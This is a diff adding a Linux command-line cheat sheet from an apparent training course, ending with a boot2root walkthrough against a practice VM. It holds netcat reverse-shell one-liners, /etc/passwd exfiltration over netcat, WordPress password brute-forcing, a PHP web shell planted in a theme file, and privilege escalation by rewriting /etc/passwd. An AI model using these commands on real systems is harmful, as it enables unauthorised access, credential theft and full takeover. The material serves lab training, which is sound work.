@@ -1,0 +1,239 @@
+# Packages
+sudo apt update
+sudo apt upgrade
+sudo apt install <packagename>
+sudo apt list --installed
+git clone <repo url>
+
+# Fundamentals 
+echo Hello world
+man <command>
+info <command>
+man nc
+    /-l
+pwd
+cd <path>
+cd ~
+cd /home/<user>
+cd ../
+cd -
+ls -al
+mkdir <NewDirName>
+touch <NewFileName>
+rm <FileName>
+rm -r <DirName>
+cp <file1> <file2>
+cp -r <directory1> <directory2>
+cp <file1> <file2> <file3> <DirectoryName>
+mv <file> <directory>/<file>
+mv <oldname> <newname>
+scp user@server:/home/user/file.txt ~/destinationfile.txt
+scp ~/file.txt user@server:/home/user/destinationfile.txt
+wget <http://www.url.com/file.txt>
+curl <http://www.url.com/file.txt>
+cat <file1>
+cat <file1> <file2>
+head <file1>
+cat <file1> | head
+tail <file1>
+cat <file1> | tail
+tail -f /var/log/apache2/access.log
+file <filename>
+less <filename>
+more <filename>
+echo some random text
+echo $PATH
+echo \$PATH
+echo hello; echo world
+ls -al /bin/ & cat /etc/passwd
+file idontexist && echo neverseen!
+ls /home && echo seen!
+echo hello || echo neverseen
+cat idontexist || echo seen
+!!
+sudo !!
+history
+history 5
+Ctrl+R 
+   <search string>
+Alt+.
+
+# Standard in, out, error redirection
+echo TextIntoFile 1> file.txt
+echo TextIntoFile > file.txt
+echo More text into file >> file.txt
+cat idontexist
+cat idontexist 2>/dev/null
+cat < file.txt
+grep findme < file.txt
+cat /etc/passwd | grep root
+cat /etc/passwd | grep $(whoami)
+cat /etc/passwd | grep `whoami`
+nc -lvnp 1234
+echo hello | nc 127.0.0.1 1234
+nc -lvnp 1234
+nc 127.0.0.1 1234
+
+# Reverse shell building blocks
+mkfifo <newpipefile>
+echo hello | <newpipefile>
+cat <newpipefile>
+cat <newpipefile> | /bin/sh
+echo whoami > <newpipefile>
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f
+
+# Data manipulation
+wget https://raw.githubusercontent.com/angry-bender/linuxtraining/master/grep.txt
+ls -al
+grep -n "boo" grep.txt
+grep -v "boo" grep.txt
+grep -o "BOO" grep.txt
+grep -l "boo" *
+grep -i "BOO" grep.txt
+grep -x "boo" grep.txt
+grep -A2 "booz" grep.txt
+grep -B2 "booz" grep.txt
+grep -C2 "booz" grep.txt
+egrep "book|booz" grep.txt
+grep -rail "bo" *
+grep -rai "bo" *
+cat /etc/passwd | cut -d: -f1
+cat /etc/passwd | cut -d: -f1,3
+nmap -n -sn <orphanip>/24 -v -oN test.nmap
+cat test.nmap | grep -v down | grep report | cut -d" " -f5
+echo simon | tr "s" "S"
+echo simon treadaway | tr "st" "ST"
+echo -e "Simon\nTreadaway" | tr -d "\n"
+echo "   Simon    Treadaway" | tr -s " "
+echo encode | tr "a-z" "n-za-m"
+wc -w grep.txt
+wc -l grep.txt
+wc -c grep.txt
+sort grep.txt
+cat ~/.bash_history | sort | uniq
+cat ~/.bash_history | sort | uniq -c
+cat ~/.bash_history | sort | uniq -c | sort -bgr
+sed -e 's/oldstring/newstring/g' <filename>
+sed -i -e 's/oldstring/newstring/g' <filename>
+sed -e 's/old1/new1/g' -e 's/old2/new2/g' <filename>
+cat /etc/passwd | head sed '1s/x/TEST/g'
+find /etc/ -name "*.conf"
+locate .conf
+find / -name passwd
+find / -name passwd 2>/dev/null
+tar zcvf file.tar.gz path/to/file
+tar zxvf file.tar.gz
+unzip file.zip
+bunzip2 file.bz2
+gunzip file.gz
+zcat /var/log/secure*.gz
+vim newfile.txt
+	h    -> move left
+	j    -> move down
+	k    -> move up
+	l    -> move right
+	i    -> insert
+	a    -> after
+	A    -> end of line
+	o    -> after current line
+	O    -> before current line
+   Ctrl+c    -> exit insert mode
+	:q   -> quit
+	:q!  -> force quit (ignore changes)
+	:w   -> save
+	:wq  -> exit and save
+
+# Permissions and groups
+sudo <command>
+cat /etc/passwd
+cat /etc/shadow
+sudo cat /etc/shadow
+whoami
+who
+w
+id
+su <user>
+su -
+passwd
+passwd <username>
+cat /etc/groups
+ls -lh
+chown <user> <file>
+chown -R <user> <file>
+chgrp <group> <file>
+chgrp -R <group> <file>
+chmod 640 test.txt
+chmod u=rw,g=r,o= test.txt
+chmod u+r test.txt
+chmod u+r,o-r test.txt
+
+# Working with processes
+ps aux
+ps -elf
+ps -lfu <username>
+pstree
+top
+htop
+./insamedir
+../../u9sr/bin/lscpu
+/usr/bin/lscpu
+echo $PATH
+kill <pid>
+kill -9 <pid>
+
+# Networking
+ip link
+ifconfig
+ip address
+ip address show <int>
+ip route ip neighbour
+python -m SimpleHTTPServer
+python -m SimpleHTTPServer 1234
+nc -lvnp 1234 | tee /tmp/passwd
+cat /etc/passwd | nc 127.0.0.1 1234
+
+******************
+# BOOT2ROOT
+******************
+# Enumeration - nmap, web, wordpress, wpscan
+nmap -n -F <boot2root_IP>
+firefox http://<boot2root_IP>:80
+dirb http://<boot2root_IP>:80
+firefox http://<boot2root_IP>:80/secret
+sudo vim /etc/hosts
+<boot2root_IP>	vtcsec
+wpscan --url http://<boot2root_IP>/secret/ --enumerate u
+wpscan --url http://<boot2root_IP>/secret/ --usernames admin -P /usr/share/wordlists/metasploit/http_default_users.txt
+
+# Web shell - Google "easy simple php webshell"
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+
+http://vtcsec/secret/wp-content/themes/twentyseventeen/404.php?cmd=whoami
+
+# Reverse shell - Google "reverse shell cheat sheet pentesetmonkey"
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_IP> 1234 >/tmp/f
+nc -lvnp 1234
+http://vtcsec/secret/wp-content/themes/twentyseventeen/404.php?cmd=<url_encoded_reverse_shell>
+
+# Upgrading dumb shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl+z
+stty raw -echo
+fg
+export TERM=screen
+reset
+
+# Privesc
+sudo -l
+find / -writable -type f 2>/dev/null > /tmp/writable.txt
+cat /tmp/writable.txt | grep -i passwd
+cat /tmp/writable.txt | grep -i shadow
+openssl passwd -1 newpassword
+cat /etc/passwd | sed ‘1s/x/$1$1I/u6b/h$dEaFuQXorf1j9a4SVnfzk./g’
+su root
+
